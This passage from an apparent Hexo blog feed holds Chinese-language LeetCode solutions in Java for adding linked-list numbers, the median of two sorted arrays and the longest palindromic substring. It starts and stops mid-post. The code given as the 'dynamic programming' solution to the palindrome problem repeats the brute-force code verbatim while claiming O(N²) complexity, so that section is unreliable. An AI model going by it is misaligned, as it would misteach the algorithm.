<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">2个逆序的链表，要求从低位开始相加，得出结果也逆序输出，返回值是逆序结果链表的头节点</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p><font size="4" face="Open Sans">这题需要注意的地方是进制问题。<br>考虑极端情况，例如</font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">Input: (<span class="hljs-number">9</span> -&gt; <span class="hljs-number">9</span> -&gt; <span class="hljs-number">9</span>) + (<span class="hljs-number">1</span> -&gt; )<br>Output: <span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span> -&gt; <span class="hljs-number">0</span> -&gt; <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans">由题可知两个链表都是逆序的，相同下标相加，如果一条链的长度大于另一条的长度，那么多出来的结点只需加0即可。思路是再创建一个辅助链表，让下标相同的数相加，如果存在进位问题，用carry代替所要进位的数，将 <code>(l1.val + l2.val + carry) % 10</code> 存入到辅助链表，再让链表l1和l2指向下一个结点。需要注意，这里要多定义一个pre结点来防止首结点丢失。</font></p>
<!-- <font size="4" face="Open Sans"><b>代码</b></font> -->

<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> ListNode <span class="hljs-title">addTwoNumbers</span><span class="hljs-params">(ListNode l1, ListNode l2)</span> </span>&#123;<br>        ListNode pre = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);<br>        ListNode cur = pre;<br>        <span class="hljs-keyword">int</span> carry = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">while</span> (l1 != <span class="hljs-keyword">null</span> || l2 != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">int</span> x = l1 == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : l1.val;	<span class="hljs-comment">//l1长度小于l2，那么当执行到l1.next为null的时候，x的值就赋值为零</span><br>            <span class="hljs-keyword">int</span> y = l2 == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : l2.val;<br>            <span class="hljs-keyword">int</span> sum = x + y + carry;<br><br>            carry = sum / <span class="hljs-number">10</span>;<br>            sum = sum % <span class="hljs-number">10</span>;<br>            cur.next = <span class="hljs-keyword">new</span> ListNode(sum);<br><br>            cur = cur.next;<br>            <span class="hljs-keyword">if</span> (l1 != <span class="hljs-keyword">null</span>) &#123;<br>                l1 = l1.next;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (l2 != <span class="hljs-keyword">null</span>) &#123;<br>                l2 = l2.next;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (carry == <span class="hljs-number">1</span>) &#123;<br>            cur.next = <span class="hljs-keyword">new</span> ListNode(carry);<br>        &#125;<br>        <span class="hljs-keyword">return</span> pre.next;<br>    &#125;<br></code></pre></div></td></tr></table></figure>

<!-- <font size="4" face="Open Sans"><b>复杂度分析</b></font> -->

<h3 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(max(m,n))</b></font><font size="4" face="Open Sans">,其中m,n为两个链表的长度。我们呢要遍历两个链表的全部位置，而处理每个位置只需要O(1)的时间</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(max(m,n))</b></font><font size="4" face="Open Sans"> ,答案链表的长度最多为较长链表的长度 +1 。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-04-FindMedianSortedArrays</title>
    <url>/article/9950e4a9.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">There are two sorted arrays <b>nums1</b> and <b>nums2</b> of size m and n respectively.</font></p>
<p><font color="#856363" size="4" face="Open Sans">Find the median of the two sorted arrays. The overall run time complexity should be O(log (m+n)).</font></p>
<p><font color="#856363" size="4" face="Open Sans">You may assume <b>nums1</b> and <b>nums2</b> cannot be both empty.</font></p>
<a id="more"></a>

<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">nums1 = [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>]<br>nums2 = [<span class="hljs-number">2</span>]<br><br>The median <span class="hljs-keyword">is</span> <span class="hljs-number">2.0</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">nums1 = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]<br>nums2 = [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]<br><br>The median <span class="hljs-keyword">is</span> (<span class="hljs-number">2</span> + <span class="hljs-number">3</span>)/<span class="hljs-number">2</span> = <span class="hljs-number">2.5</span><br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">给定两个大小为m和n的有序数组nums1和nums2。</font><br><font size="4" face="Open Sans">请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为 O(log(m+n))。</font><br><font size="4" face="Open Sans">你可以假设nums1和nums2不会同时为空。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一-二分查找"><a href="#方法一-二分查找" class="headerlink" title="方法一: 二分查找"></a>方法一: 二分查找</h3><p><font size="4" face="Open Sans">这一题所用的思想是二分法，才能让我们最后实现的时间复杂度为log,所以我们需要从二分查找去考虑这个问题。具体的解题思路，可以去看看LeetCode官方给的很仔细的解释<a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/solution/xun-zhao-liang-ge-you-xu-shu-zu-de-zhong-wei-s-114/" target="_blank" rel="noopener"><br>寻找两个有序数组的中位数</a></font></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D04_FindMedianSortedArrays</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">double</span> <span class="hljs-title">findMedianSortedArrays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;<br>        <span class="hljs-keyword">int</span> totalLength = length1 + length2;<br>        <span class="hljs-keyword">if</span> (totalLength % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">int</span> midIndex = totalLength / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">double</span> median = getKthElement(nums1, nums2, midIndex + <span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span> median;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">int</span> midIndex1 = totalLength / <span class="hljs-number">2</span>, midIndex2 = totalLength / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">double</span> median = (getKthElement(nums1, nums2, midIndex1 + <span class="hljs-number">1</span>) + getKthElement(nums1, nums2, midIndex2 + <span class="hljs-number">1</span>)) / <span class="hljs-number">2.0</span>;<br>            <span class="hljs-keyword">return</span> median;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getKthElement</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums1, <span class="hljs-keyword">int</span>[] nums2, <span class="hljs-keyword">int</span> k)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> length1 = nums1.length, length2 = nums2.length;<br>        <span class="hljs-keyword">int</span> index1 = <span class="hljs-number">0</span>, index2 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">int</span> kthElement = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>            <span class="hljs-comment">//边界情况</span><br>            <span class="hljs-keyword">if</span> (index1 == length1) &#123;<br>                <span class="hljs-keyword">return</span> nums2[index2 + k - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (index2 == length2) &#123;<br>                <span class="hljs-keyword">return</span> nums1[index1 + k - <span class="hljs-number">1</span>];<br>            &#125;<br>            <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-keyword">return</span> Math.min(nums1[index1], nums2[index2]);<br>            &#125;<br><br>            <span class="hljs-comment">//正常情况</span><br>            <span class="hljs-keyword">int</span> half = k / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">int</span> newIndex1 = Math.min(index1 + half, length1) - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> newIndex2 = Math.min(index2 + half, length2) - <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">int</span> pivot1 = nums1[newIndex1], pivot2 = nums2[newIndex2];<br>            <span class="hljs-keyword">if</span> (pivot1 &lt;= pivot2) &#123;<br>                k -= (newIndex1 - index1 + <span class="hljs-number">1</span>);<br>                index1 = newIndex1 + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                k -= (newIndex2 - index2 + <span class="hljs-number">1</span>);<br>                index2 = newIndex2 + <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(log(m+n))</b></font><font size="4" face="Open Sans">,其中m和n分别是数组nums1和nums2的长度。初始化有 <code>k=(m+n)/2</code> 或 <code>k=(m+n)/2+1</code>, 每一轮循环可以将查找范围减少一半，因此时间复杂度是O(log(m+n))。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">。</font></p>
<h3 id="方法二-划分数组"><a href="#方法二-划分数组" class="headerlink" title="方法二: 划分数组"></a>方法二: 划分数组</h3><p><font size="4" face="Open Sans">这个算法有点难度，所以留下以后来继续深究。</font></p>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode-05-LongestPalindromicSubstring</title>
    <url>/article/62c78ede.html</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p><font color="#856363" size="4" face="Open Sans">Given a string s, return the longest palindromic substring in s.</font></p>
<a id="more"></a>

<hr>
<font size="4" face="Open Sans"><b>Example1</b></font>

<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Input</span>: s = "babad"<br>Output: "bab"<br>Note: "aba" <span class="hljs-keyword">is</span> <span class="hljs-keyword">also</span> a <span class="hljs-keyword">valid</span> answer.<br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example2</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> s = <span class="hljs-string">"cbbd"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-string">"bb"</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example3</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> s = <span class="hljs-string">"a"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-string">"a"</span><br></code></pre></div></td></tr></table></figure>

<p><font size="4" face="Open Sans"><b>Example4</b></font></p>
<figure class="highlight avrasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs avrasm"><span class="hljs-symbol">Input:</span> s = <span class="hljs-string">"ac"</span><br><span class="hljs-symbol">Output:</span> <span class="hljs-string">"a"</span><br></code></pre></div></td></tr></table></figure>

<h2 id="题目大意"><a href="#题目大意" class="headerlink" title="题目大意"></a>题目大意</h2><p><font size="4" face="Open Sans">就是找出字符串s中最大的回文子串，然后输出。</font></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><h3 id="方法一-暴力匹配"><a href="#方法一-暴力匹配" class="headerlink" title="方法一: 暴力匹配"></a>方法一: 暴力匹配</h3><p><font size="4" face="Open Sans">暴力匹配思想很简单，这里不解释太多，很容易通过代码来理解意思。</font></p>
<p><font size="4" face="Open Sans">暴力解法时间复杂度高，但是思路清晰、编写简单。由于编写正确性的可能性很大，<b>可以使用暴力匹配算法检验我们编写的其它算法是否正确。</b>优化的解法在很多时候，是基于“暴力解法”，以空间换时间得到的，因此思考清楚暴力解法，分析其缺点，很多时候能为我们打开思路。</font></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D05_LongestPalindromicSubstring</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = s.length();<br>        <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> maxLen = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> begin = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">char</span>[] charArray = s.toCharArray();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; len; j++) &#123;<br>                <span class="hljs-keyword">if</span> (j - i + <span class="hljs-number">1</span> &gt; maxLen &amp;&amp; validPalindromic(charArray, i, j))&#123;<br>                    maxLen = j - i + <span class="hljs-number">1</span>;<br>                    begin = i;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s.substring(begin, begin + maxLen);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">validPalindromic</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[] charArray, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(left &lt; right) &#123;<br>            <span class="hljs-keyword">if</span>(charArray[left] != charArray[right])&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            left++;<br>            right--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N³)</b></font><font size="4" face="Open Sans">这里N是字符串的长度，枚举字符串的左边界、右边界，然后继续验证子串是否是回文，这三种操作都与N相关；</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(1)</b></font><font size="4" face="Open Sans">，只使用到常数个临时变量，与字符串长度无关。</font></p>
<h3 id="方法二-动态规划"><a href="#方法二-动态规划" class="headerlink" title="方法二: 动态规划"></a>方法二: 动态规划</h3><p><font size="4" face="Open Sans">主要思想是，一个回文，去掉两头以后，剩下的部分依然是回文；<br>依然从回文串的定义展开讨论：</font><br><font size="4" face="Open Sans">&nbsp;&nbsp;&nbsp;&nbsp;<b>·</b>  如果一个字符串的头尾两个字符都不相等，那么这个字符串一定不是回文串；</font><br><font size="4" face="Open Sans">&nbsp;&nbsp;&nbsp;&nbsp;<b>·</b>  如果一个字符串的头尾两个字符相等，才有必要继续判断下去。</font><br><font size="4" face="Open Sans">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>a</b> 如果里面的子串是回文，整体就是回文串；</font><br><font size="4" face="Open Sans">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<b>b</b> 如果里面的子串不是回文串，整体就不是回文串。</font><br><font size="4" face="Open Sans">即：<b>在头尾字符相等的情况下，里面子串的回文性质据定了整个子串的回文性质</b>，这就是状态转移。因此可以把「状态」定义为原字符的一个子串是否为回文子串。</font></p>
<p><font size="4" face="Open Sans">借鉴了LeetCode中大牛的题解。<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/solution/zhong-xin-kuo-san-dong-tai-gui-hua-by-liweiwei1419/" target="_blank" rel="noopener">动态规划、中心扩散、Manacher 算法</a></font></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D05_LongestPalindromicSubstring</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = s.length();<br>        <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) &#123;<br>            <span class="hljs-keyword">return</span> s;<br>        &#125;<br><br>        <span class="hljs-keyword">int</span> maxLen = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">int</span> begin = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">char</span>[] charArray = s.toCharArray();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len - <span class="hljs-number">1</span>; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = i + <span class="hljs-number">1</span>; j &lt; len; j++) &#123;<br>                <span class="hljs-keyword">if</span> (j - i + <span class="hljs-number">1</span> &gt; maxLen &amp;&amp; validPalindromic(charArray, i, j))&#123;<br>                    maxLen = j - i + <span class="hljs-number">1</span>;<br>                    begin = i;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> s.substring(begin, begin + maxLen);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">validPalindromic</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[] charArray, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">while</span>(left &lt; right) &#123;<br>            <span class="hljs-keyword">if</span>(charArray[left] != charArray[right])&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;<br>            &#125;<br>            left++;<br>            right--;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br><br>&#125;<br></code></pre></div></td></tr></table></figure>

<h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p><font size="4" face="Open Sans">  * 时间复杂度：</font><font size="5" face="Open Sans"><b>O(N²)</b></font><font size="4" face="Open Sans">。</font><br><font size="4" face="Open Sans">  * 空间复杂度：</font><font size="5" face="Open Sans"><b>O(N²)</b></font><font size="4" face="Open Sans">，二维dp问题，一个状态得用二维有序数对表示，因此空间复杂度是O(N²)。</font></p>
<h3 id="方法三-中心扩散法"><a href="#方法三-中心扩散法" class="headerlink" title="方法三:中心扩散法"></a>方法三:中心扩散法</h3><p><font size="4" face="Open Sans">暴力法采用双指针两边夹，验证是否是回文子串。<br>    除了枚举字符串的左右边界以外，比较容易想到的是<b>枚举可能出现的回文子串的”中心位置”，从”中心位置”尝试尽可能扩散出去，得到一个回文串。</b><br>    因此中心扩散法的思路是：遍历每一个索引，以这个索引为中心，利用”回文串”中心对称的特点，往两边扩散，看最多能扩散多远。<br>    枚举”中心位置”时间复杂度为O(N),从”中心位置”扩散得到”回文子串”的时间复杂度为O(N),因此时间复杂度可以降到O(N²)。<br>    在这里要注意一个细节：回文串在长度为奇数和偶数的时候，”回文中心”的形式是不一样的。<br>    &nbsp;&nbsp;&nbsp;&nbsp;<b>Ⅰ</b> 奇数回文串的”中心”是一个具体的字符，例如：回文串 <code>&quot;aba&quot;</code> 的中心是字符 <code>&quot;b&quot;</code> ;<br>    &nbsp;&nbsp;&nbsp;&nbsp;<b>Ⅱ</b> 偶数回文串的”中心”是位于中间的两个字符的”空隙”，例如：回文串 <code>abba</code> 的中心是两个 <code>b</code> 中间的那个”空隙”<br></font></p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> leetcode;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D05_03LongestPalindromicSubstring</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">longestPalindrome</span><span class="hljs-params">(String s)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = s.length();<br>        <span class="hljs-keyword">if</span> (len &lt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> s;<br><br>        <span class="hljs-keyword">int</span> maxLen = <span class="hljs-number">1</span>;<br>        String res = s.substring(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>            String oldStr = centerSpread(s, i, i);<br>            String evenStr = centerSpread(s, i, i + <span class="hljs-number">1</span>);<br>            String maxLenStr = oldStr.length() &gt; evenStr.length() ? oldStr : evenStr;<br>            <span class="hljs-keyword">if</span> (maxLenStr.length() &gt; maxLen) &#123;<br>                maxLen = maxLenStr.length();<br>                res = maxLenStr;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> String <span class="hljs-title">centerSpread</span><span class="hljs-params">(String s, <span class="hljs-keyword">int</span> left, <span class="hljs-keyword">int</span> right)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> len = s.length();<br>        <span class="hljs-keyword">int</span> i = left;<br>        <span class="hljs-keyword">int</span> j = right;<br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; j &lt; len) &#123;<br>            <span class="hljs-keyword">if</span> (s.charAt(i) == s.charAt(j)) &#123;<br>                i--;<br>                j++;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// 